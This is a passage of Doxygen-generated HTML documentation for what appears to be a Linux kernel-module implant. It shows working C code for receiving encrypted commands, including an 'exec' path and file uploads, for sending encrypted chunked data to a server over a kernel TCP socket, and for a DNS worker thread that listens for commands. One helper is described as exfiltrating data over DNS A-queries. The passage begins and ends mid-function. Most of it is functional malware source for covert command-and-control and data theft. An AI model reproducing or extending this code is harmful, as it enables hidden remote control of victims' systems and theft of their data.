<div class="line"><span class="lineno">  329</span>    <span class="keywordflow">if</span> (ret &lt; 0)</div>
<div class="line"><span class="lineno">  330</span>        <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  331</span> </div>
<div class="line"><span class="lineno">  332</span>    <span class="comment">// Clamp for text command mode</span></div>
<div class="line"><span class="lineno">  333</span>    <span class="keywordflow">if</span> (!<a class="code hl_variable" href="../../d3/dc0/upload_8h.html#a281121106d88af2a7aad56035f113d84">receiving_file</a> &amp;&amp; dlen &gt; max_len - 1)</div>
<div class="line"><span class="lineno">  334</span>        dlen = max_len - 1;</div>
<div class="line"><span class="lineno">  335</span> </div>
<div class="line"><span class="lineno">  336</span>    <span class="comment">// fuck exec prefix</span></div>
<div class="line"><span class="lineno">  337</span>    <span class="keywordflow">if</span> (dlen &gt;= 4 &amp;&amp; !memcmp(decrypted, <span class="stringliteral">&quot;exec&quot;</span>, 4)) {</div>
<div class="line"><span class="lineno">  338</span>        memcpy(buffer, decrypted, dlen);</div>
<div class="line"><span class="lineno">  339</span>        buffer[dlen] = <span class="charliteral">&#39;\0&#39;</span>;</div>
<div class="line"><span class="lineno">  340</span>        ret = dlen;</div>
<div class="line"><span class="lineno">  341</span>    }</div>
<div class="line"><span class="lineno">  342</span> </div>
<div class="line"><span class="lineno">  343</span>    <span class="comment">// File upload mode</span></div>
<div class="line"><span class="lineno">  344</span>    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d3/dc0/upload_8h.html#a281121106d88af2a7aad56035f113d84">receiving_file</a>) {</div>
<div class="line"><span class="lineno">  345</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;RECEIVING FILE : got %zu bytes&quot;</span>, dlen);</div>
<div class="line"><span class="lineno">  346</span>        ret = <a class="code hl_function" href="../../d3/dc0/upload_8h.html#af522c616596f7e0f8b67ced63421dfa3">handle_upload_chunk</a>(decrypted, dlen, <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c">TCP</a>);</div>
<div class="line"><span class="lineno">  347</span>    }</div>
<div class="line"><span class="lineno">  348</span> </div>
<div class="line"><span class="lineno">  349</span>    <span class="comment">// Otherwise it is the normal text command</span></div>
<div class="line"><span class="lineno">  350</span>    <span class="keywordflow">else</span> {</div>
<div class="line"><span class="lineno">  351</span>        memcpy(buffer, decrypted, dlen);</div>
<div class="line"><span class="lineno">  352</span>        buffer[dlen] = <span class="charliteral">&#39;\0&#39;</span>;</div>
<div class="line"><span class="lineno">  353</span>        ret = dlen;</div>
<div class="line"><span class="lineno">  354</span>    }</div>
<div class="line"><span class="lineno">  355</span> </div>
<div class="line"><span class="lineno">  356</span>    vfree(decrypted);</div>
<div class="line"><span class="lineno">  357</span>    <span class="keywordflow">return</span> ret;</div>
<div class="line"><span class="lineno">  358</span> </div>
<div class="line"><span class="lineno">  359</span>cleanup:</div>
<div class="line"><span class="lineno">  360</span>    kfree(payloadbuf);</div>
<div class="line"><span class="lineno">  361</span>    kfree(seen);</div>
<div class="line"><span class="lineno">  362</span>    vfree(received);</div>
<div class="line"><span class="lineno">  363</span>    <span class="keywordflow">return</span> ret;</div>
<div class="line"><span class="lineno">  364</span>}</div>
<div class="ttc" id="acmd_8c_html_a6e4500656cc3e4933c0d6dc0507f0696"><div class="ttname"><a href="../../da/d32/cmd_8c.html#a6e4500656cc3e4933c0d6dc0507f0696">get_worker_socket</a></div><div class="ttdeci">struct socket * get_worker_socket(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d5/df8/socket_8c_source.html#l00017">socket.c:17</a></div></div>
<div class="ttc" id="aconfig_8h_html_aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c"><div class="ttname"><a href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c">TCP</a></div><div class="ttdeci">@ TCP</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00029">config.h:29</a></div></div>
<div class="ttc" id="aconfig_8h_html_ace1d139b840ca4186a2886360666dfcd"><div class="ttname"><a href="../../db/d16/config_8h.html#ace1d139b840ca4186a2886360666dfcd">STD_BUFFER_SIZE</a></div><div class="ttdeci">#define STD_BUFFER_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00068">config.h:68</a></div></div>
<div class="ttc" id="anetwork_8c_html_a2d214f4194a9f20a702b2ba69159a868"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a></div><div class="ttdeci">#define EOT_CODE</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00018">network.c:18</a></div></div>
<div class="ttc" id="anetwork_8c_html_a882a4da02deaef0da1da02f794925cb8"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a882a4da02deaef0da1da02f794925cb8">all_chunks_received</a></div><div class="ttdeci">static bool all_chunks_received(bool *received, size_t count)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00022">network.c:22</a></div></div>
<div class="ttc" id="aupload_8h_html_a281121106d88af2a7aad56035f113d84"><div class="ttname"><a href="../../d3/dc0/upload_8h.html#a281121106d88af2a7aad56035f113d84">receiving_file</a></div><div class="ttdeci">bool receiving_file</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d4a/upload_8c_source.html#l00010">upload.c:10</a></div></div>
<div class="ttc" id="aupload_8h_html_af522c616596f7e0f8b67ced63421dfa3"><div class="ttname"><a href="../../d3/dc0/upload_8h.html#af522c616596f7e0f8b67ced63421dfa3">handle_upload_chunk</a></div><div class="ttdeci">int handle_upload_chunk(const char *data, size_t len, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d4a/upload_8c_source.html#l00016">upload.c:16</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="abcb7f2b3978815223754a91b930e28ee" name="abcb7f2b3978815223754a91b930e28ee"></a>
<h2 class="memtitle"><span class="permalink"><a href="#abcb7f2b3978815223754a91b930e28ee">&#9670;&#160;</a></span>send_file_to_server()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int send_file_to_server </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>filename</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

</div>
</div>
<a id="a375e772b2efc7540285ea61d2c9e5694" name="a375e772b2efc7540285ea61d2c9e5694"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a375e772b2efc7540285ea61d2c9e5694">&#9670;&#160;</a></span>send_to_server()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int send_to_server </td>
          <td>(</td>
          <td class="paramtype">enum <a class="el" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184c">Protocol</a>&#160;</td>
          <td class="paramname"><em>protocol</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>message</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>...</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>send_to_server - Sends a formatted message to the server using the specified protocol. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">protocol</td><td>The communication protocol to use (TCP or DNS). </td></tr>
    <tr><td class="paramname">message</td><td>The format string for the message to send. </td></tr>
    <tr><td class="paramname">...</td><td>Additional arguments for formatting the message.</td></tr>
  </table>
  </dd>
</dl>
<p>Return: 0 on success, negative error code on failure. </p>

<p class="definition">Definition at line <a class="el" href="../../d6/d6e/network_8c_source.html#l00067">67</a> of file <a class="el" href="../../d6/d6e/network_8c_source.html">network.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   67</span>                                                               {</div>
<div class="line"><span class="lineno">   68</span>    <span class="keywordflow">if</span> (protocol == <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c">TCP</a> &amp;&amp; !<a class="code hl_function" href="../../da/d32/cmd_8c.html#a6e4500656cc3e4933c0d6dc0507f0696">get_worker_socket</a>()) {</div>
<div class="line"><span class="lineno">   69</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;send_to_server: socket is not initialized\n&quot;</span>);</div>
<div class="line"><span class="lineno">   70</span>        <span class="keywordflow">return</span> -EINVAL;</div>
<div class="line"><span class="lineno">   71</span>    }</div>
<div class="line"><span class="lineno">   72</span> </div>
<div class="line"><span class="lineno">   73</span>    <span class="comment">// Check if there is only one parameter (the string itself)</span></div>
<div class="line"><span class="lineno">   74</span>    va_list args;</div>
<div class="line"><span class="lineno">   75</span>    va_start(args, <a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>);</div>
<div class="line"><span class="lineno">   76</span>    <span class="keywordflow">if</span> (va_arg(args, <span class="keywordtype">char</span> *) == NULL) {</div>
<div class="line"><span class="lineno">   77</span>        va_end(args);</div>
<div class="line"><span class="lineno">   78</span> </div>
<div class="line"><span class="lineno">   79</span>        <span class="comment">// It protocol is DNS, send the message directly</span></div>
<div class="line"><span class="lineno">   80</span>        <span class="keywordflow">if</span> (protocol == <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a>)</div>
<div class="line"><span class="lineno">   81</span>            <span class="keywordflow">return</span> <a class="code hl_function" href="../../d9/d94/network_8h.html#a1f3fd0d4b58aa92d0cf7a54c4af03671">dns_send_data</a>(<a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>, strlen(<a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>));</div>
<div class="line"><span class="lineno">   82</span> </div>
<div class="line"><span class="lineno">   83</span>        <span class="comment">// If protocol is TCP, send the raw message</span></div>
<div class="line"><span class="lineno">   84</span>        <span class="keywordflow">return</span> <a class="code hl_function" href="../../d6/d6e/network_8c.html#a57b1c96d9aa9b9d9453d0dca6a7c3b87">send_to_server_raw</a>(<a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>, strlen(<a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>));</div>
<div class="line"><span class="lineno">   85</span>    }</div>
<div class="line"><span class="lineno">   86</span>    va_end(args);</div>
<div class="line"><span class="lineno">   87</span> </div>
<div class="line"><span class="lineno">   88</span>    va_start(args, <a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>);</div>
<div class="line"><span class="lineno">   89</span> </div>
<div class="line"><span class="lineno">   90</span>    <span class="comment">// If there are more parameters, format the message</span></div>
<div class="line"><span class="lineno">   91</span>    <span class="keywordtype">char</span> *formatted_message = <a class="code hl_function" href="../../d6/d6e/network_8c.html#a4801a223fe0fd872336dbab971d29903">vformat_string</a>(<a class="code hl_variable" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>, args);</div>
<div class="line"><span class="lineno">   92</span>    va_end(args);</div>
<div class="line"><span class="lineno">   93</span> </div>
<div class="line"><span class="lineno">   94</span>    <span class="keywordflow">if</span> (!formatted_message) {</div>
<div class="line"><span class="lineno">   95</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;send_to_server: failed to format message\n&quot;</span>);</div>
<div class="line"><span class="lineno">   96</span>        <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"><span class="lineno">   97</span>    }</div>
<div class="line"><span class="lineno">   98</span> </div>
<div class="line"><span class="lineno">   99</span>    <span class="comment">// If the protocol is DNS, send the formatted message over DNS</span></div>
<div class="line"><span class="lineno">  100</span>    <span class="keywordflow">if</span> (protocol == <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a>)</div>
<div class="line"><span class="lineno">  101</span>        <span class="keywordflow">return</span> <a class="code hl_function" href="../../d9/d94/network_8h.html#a1f3fd0d4b58aa92d0cf7a54c4af03671">dns_send_data</a>(formatted_message, strlen(formatted_message));</div>
<div class="line"><span class="lineno">  102</span> </div>
<div class="line"><span class="lineno">  103</span>    <span class="comment">// Send the formatted message through TCP</span></div>
<div class="line"><span class="lineno">  104</span>    <span class="keywordtype">int</span> ret_code =</div>
<div class="line"><span class="lineno">  105</span>        <a class="code hl_function" href="../../d6/d6e/network_8c.html#a57b1c96d9aa9b9d9453d0dca6a7c3b87">send_to_server_raw</a>(formatted_message, strlen(formatted_message));</div>
<div class="line"><span class="lineno">  106</span> </div>
<div class="line"><span class="lineno">  107</span>    <span class="comment">// Free the formatted message buffer</span></div>
<div class="line"><span class="lineno">  108</span>    kfree(formatted_message);</div>
<div class="line"><span class="lineno">  109</span>    <span class="keywordflow">return</span> ret_code;</div>
<div class="line"><span class="lineno">  110</span>}</div>
<div class="ttc" id="aconfig_8h_html_a0b2e8c7f76df48129f994ecc46d5c66c"><div class="ttname"><a href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a></div><div class="ttdeci">char * message</div></div>
<div class="ttc" id="aconfig_8h_html_aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812"><div class="ttname"><a href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a></div><div class="ttdeci">@ DNS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00030">config.h:30</a></div></div>
<div class="ttc" id="anetwork_8c_html_a4801a223fe0fd872336dbab971d29903"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a4801a223fe0fd872336dbab971d29903">vformat_string</a></div><div class="ttdeci">static char * vformat_string(const char *fmt, va_list ap)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00036">network.c:36</a></div></div>
<div class="ttc" id="anetwork_8c_html_a57b1c96d9aa9b9d9453d0dca6a7c3b87"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a57b1c96d9aa9b9d9453d0dca6a7c3b87">send_to_server_raw</a></div><div class="ttdeci">int send_to_server_raw(const char *data, size_t len)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00123">network.c:123</a></div></div>
<div class="ttc" id="anetwork_8h_html_a1f3fd0d4b58aa92d0cf7a54c4af03671"><div class="ttname"><a href="../../d9/d94/network_8h.html#a1f3fd0d4b58aa92d0cf7a54c4af03671">dns_send_data</a></div><div class="ttdeci">int dns_send_data(const char *data, size_t len)</div><div class="ttdoc">Exfiltrate a data buffer over DNS by hex-chunked A-queries.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00149">dns.c:149</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a57b1c96d9aa9b9d9453d0dca6a7c3b87" name="a57b1c96d9aa9b9d9453d0dca6a7c3b87"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a57b1c96d9aa9b9d9453d0dca6a7c3b87">&#9670;&#160;</a></span>send_to_server_raw()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int send_to_server_raw </td>
          <td>(</td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>len</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>send_to_server_raw - Sends raw data to the server using the TCP protocol. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td>The data to send. </td></tr>
    <tr><td class="paramname">len</td><td>The length of the data.</td></tr>
  </table>
  </dd>
</dl>
<p>This function encrypts the data, splits it into chunks, and sends each chunk to the server. Each chunk contains metadata about the total number of chunks, its index, and the length of the data in the chunk.</p>
<p>Return: 0 on success, negative error code on failure. </p>

<p class="definition">Definition at line <a class="el" href="../../d6/d6e/network_8c_source.html#l00123">123</a> of file <a class="el" href="../../d6/d6e/network_8c_source.html">network.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  123</span>                                                     {</div>
<div class="line"><span class="lineno">  124</span>    <span class="keyword">struct </span>socket *sock = <a class="code hl_function" href="../../da/d32/cmd_8c.html#a6e4500656cc3e4933c0d6dc0507f0696">get_worker_socket</a>();</div>
<div class="line"><span class="lineno">  125</span>    <span class="keywordflow">if</span> (!sock)</div>
<div class="line"><span class="lineno">  126</span>        <span class="keywordflow">return</span> -EINVAL;</div>
<div class="line"><span class="lineno">  127</span> </div>
<div class="line"><span class="lineno">  128</span>    <span class="keywordtype">char</span> *encrypted_msg = NULL;</div>
<div class="line"><span class="lineno">  129</span>    <span class="keywordtype">size_t</span> encrypted_len = 0;</div>
<div class="line"><span class="lineno">  130</span> </div>
<div class="line"><span class="lineno">  131</span>    <span class="comment">// Encrypt the data before sending</span></div>
<div class="line"><span class="lineno">  132</span>    <span class="keywordflow">if</span> (<a class="code hl_function" href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a>(data, len, &amp;encrypted_msg, &amp;encrypted_len) &lt; 0)</div>
<div class="line"><span class="lineno">  133</span>        <span class="keywordflow">return</span> -EIO;</div>
<div class="line"><span class="lineno">  134</span> </div>
<div class="line"><span class="lineno">  135</span>    <span class="keywordtype">size_t</span> max_chunk_body = <a class="code hl_define" href="../../db/d16/config_8h.html#ace1d139b840ca4186a2886360666dfcd">STD_BUFFER_SIZE</a> - <a class="code hl_define" href="../../d6/d6e/network_8c.html#ad99e48752cd2b170bdaf90b5a5bbf072">CHUNK_OVERHEAD</a>;</div>
<div class="line"><span class="lineno">  136</span>    <span class="keywordtype">size_t</span> nb_chunks = DIV_ROUND_UP(encrypted_len, max_chunk_body);</div>
<div class="line"><span class="lineno">  137</span> </div>
<div class="line"><span class="lineno">  138</span>    <span class="comment">// Send each chunk individually</span></div>
<div class="line"><span class="lineno">  139</span>    <span class="keywordflow">for</span> (<span class="keywordtype">size_t</span> i = 0; i &lt; nb_chunks; ++i) {</div>
<div class="line"><span class="lineno">  140</span>        <span class="keywordtype">size_t</span> chunk_len = (i == nb_chunks - 1)</div>
<div class="line"><span class="lineno">  141</span>            ? (encrypted_len - i * max_chunk_body)</div>
<div class="line"><span class="lineno">  142</span>            : max_chunk_body;</div>
<div class="line"><span class="lineno">  143</span> </div>
<div class="line"><span class="lineno">  144</span>        <span class="keywordtype">char</span> *chunk = kzalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#ace1d139b840ca4186a2886360666dfcd">STD_BUFFER_SIZE</a>, GFP_KERNEL);</div>
<div class="line"><span class="lineno">  145</span>        <span class="keywordflow">if</span> (!chunk) {</div>
<div class="line"><span class="lineno">  146</span>            <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;send_to_server_raw: failed to allocate buffer\n&quot;</span>);</div>
<div class="line"><span class="lineno">  147</span>            vfree(encrypted_msg);</div>
<div class="line"><span class="lineno">  148</span>            <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"><span class="lineno">  149</span>        }</div>
<div class="line"><span class="lineno">  150</span> </div>
<div class="line"><span class="lineno">  151</span>        <span class="comment">// total_chunks in big-endian 32 bits</span></div>
<div class="line"><span class="lineno">  152</span>        uint32_t tc = (uint32_t)nb_chunks;</div>
<div class="line"><span class="lineno">  153</span>        chunk[0] = (uint8_t)((tc &gt;&gt; 24) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  154</span>        chunk[1] = (uint8_t)((tc &gt;&gt; 16) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  155</span>        chunk[2] = (uint8_t)((tc &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  156</span>        chunk[3] = (uint8_t)((tc &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  157</span> </div>
<div class="line"><span class="lineno">  158</span>        <span class="comment">// chunk_index in big-endian 32 bits</span></div>
<div class="line"><span class="lineno">  159</span>        uint32_t ci = (uint32_t)i;</div>
<div class="line"><span class="lineno">  160</span>        chunk[4] = (uint8_t)((ci &gt;&gt; 24) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  161</span>        chunk[5] = (uint8_t)((ci &gt;&gt; 16) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  162</span>        chunk[6] = (uint8_t)((ci &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  163</span>        chunk[7] = (uint8_t)((ci &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  164</span> </div>
<div class="line"><span class="lineno">  165</span>        <span class="comment">// chunk_len in big-endian 16 bits</span></div>
<div class="line"><span class="lineno">  166</span>        uint16_t cl = (uint16_t)chunk_len;</div>
<div class="line"><span class="lineno">  167</span>        chunk[8] = (uint8_t)((cl &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  168</span>        chunk[9] = (uint8_t)((cl &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"><span class="lineno">  169</span> </div>
<div class="line"><span class="lineno">  170</span>        memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);</div>
<div class="line"><span class="lineno">  171</span>        chunk[10 + chunk_len] = <a class="code hl_define" href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a>; <span class="comment">// End of transmission</span></div>
<div class="line"><span class="lineno">  172</span> </div>
<div class="line"><span class="lineno">  173</span>        <span class="comment">// Send the chunk using kernel socket API</span></div>
<div class="line"><span class="lineno">  174</span>        <span class="keyword">struct </span>kvec vec = { .iov_base = chunk, .iov_len = <a class="code hl_define" href="../../db/d16/config_8h.html#ace1d139b840ca4186a2886360666dfcd">STD_BUFFER_SIZE</a> };</div>
<div class="line"><span class="lineno">  175</span>        <span class="keyword">struct </span>msghdr msg = { 0 };</div>
<div class="line"><span class="lineno">  176</span> </div>
<div class="line"><span class="lineno">  177</span>        <span class="keywordtype">int</span> ret = kernel_sendmsg(sock, &amp;msg, &amp;vec, 1, vec.iov_len);</div>
<div class="line"><span class="lineno">  178</span>        kfree(chunk);</div>
<div class="line"><span class="lineno">  179</span>        <span class="keywordflow">if</span> (ret &lt; 0) {</div>
<div class="line"><span class="lineno">  180</span>            vfree(encrypted_msg);</div>
<div class="line"><span class="lineno">  181</span>            <span class="keywordflow">return</span> ret;</div>
<div class="line"><span class="lineno">  182</span>        }</div>
<div class="line"><span class="lineno">  183</span>    }</div>
<div class="line"><span class="lineno">  184</span> </div>
<div class="line"><span class="lineno">  185</span>    vfree(encrypted_msg);</div>
<div class="line"><span class="lineno">  186</span>    <span class="keywordflow">return</span> 0;</div>
<div class="line"><span class="lineno">  187</span>}</div>
<div class="ttc" id="anetwork_8c_html_ad99e48752cd2b170bdaf90b5a5bbf072"><div class="ttname"><a href="../../d6/d6e/network_8c.html#ad99e48752cd2b170bdaf90b5a5bbf072">CHUNK_OVERHEAD</a></div><div class="ttdeci">#define CHUNK_OVERHEAD</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00019">network.c:19</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a043850404f54dbb1abc14ad658528669" name="a043850404f54dbb1abc14ad658528669"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a043850404f54dbb1abc14ad658528669">&#9670;&#160;</a></span>set_user_auth()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int set_user_auth </td>
          <td>(</td>
          <td class="paramtype">bool&#160;</td>
          <td class="paramname"><em>auth</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>set_user_auth - Set the user authentication status. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">auth</td><td>true to authenticate the user, false to unauthenticate. Return: 0 on success, or an error code on failure. </td></tr>
  </table>
  </dd>
</dl>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00022">22</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   22</span>                             {</div>
<div class="line"><span class="lineno">   23</span>    <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a> = auth;</div>
<div class="line"><span class="lineno">   24</span>    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a>;</div>
<div class="line"><span class="lineno">   25</span>}</div>
</div><!-- fragment -->
</div>
</div>
<a id="ad220908f5c1a61f29e2368c8db61f288" name="ad220908f5c1a61f29e2368c8db61f288"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad220908f5c1a61f29e2368c8db61f288">&#9670;&#160;</a></span>set_worker_socket()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">struct socket * set_worker_socket </td>
          <td>(</td>
          <td class="paramtype">struct socket *&#160;</td>
          <td class="paramname"><em>s</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>set_worker_socket - Sets the worker socket. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">s</td><td>The socket to set as the worker socket. Return: Pointer to the newly set worker socket. </td></tr>
  </table>
  </dd>
</dl>

<p class="definition">Definition at line <a class="el" href="../../d5/df8/socket_8c_source.html#l00030">30</a> of file <a class="el" href="../../d5/df8/socket_8c_source.html">socket.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   30</span>                                                   {</div>
<div class="line"><span class="lineno">   31</span>    mutex_lock(&amp;worker_socket_lock);</div>
<div class="line"><span class="lineno">   32</span>    <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a>)</div>
<div class="line"><span class="lineno">   33</span>        sock_release(<a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a>);</div>
<div class="line"><span class="lineno">   34</span>    <a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a> = s;</div>
<div class="line"><span class="lineno">   35</span>    mutex_unlock(&amp;worker_socket_lock);</div>
<div class="line"><span class="lineno">   36</span>    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a>;</div>
<div class="line"><span class="lineno">   37</span>}</div>
</div><!-- fragment -->
</div>
</div>
<a id="a344ccb7255b813ec1e3ab4a5834f2898" name="a344ccb7255b813ec1e3ab4a5834f2898"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a344ccb7255b813ec1e3ab4a5834f2898">&#9670;&#160;</a></span>start_dns_worker()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int start_dns_worker </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Starts the DNS worker kernel thread. </p>
<p>This function initializes and starts a kernel thread that listens for commands sent over DNS. If the thread is already running, it returns an error code indicating that the resource is busy.</p>
<dl class="section return"><dt>Returns</dt><dd>SUCCESS (0) on successful thread creation. </dd>
<dd>
-EBUSY if the thread is already running. </dd>
<dd>
Negative error code if thread creation fails. </dd></dl>

<p class="definition">Definition at line <a class="el" href="../../d2/d22/dns_2worker_8c_source.html#l00045">45</a> of file <a class="el" href="../../d2/d22/dns_2worker_8c_source.html">dns/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   45</span>                           {</div>
<div class="line"><span class="lineno">   46</span>    <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a> &amp;&amp; !IS_ERR(<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>))</div>
<div class="line"><span class="lineno">   47</span>        <span class="keywordflow">return</span> -EBUSY;</div>
<div class="line"><span class="lineno">   48</span> </div>
<div class="line"><span class="lineno">   49</span>    <span class="comment">// Create the DNS worker thread</span></div>
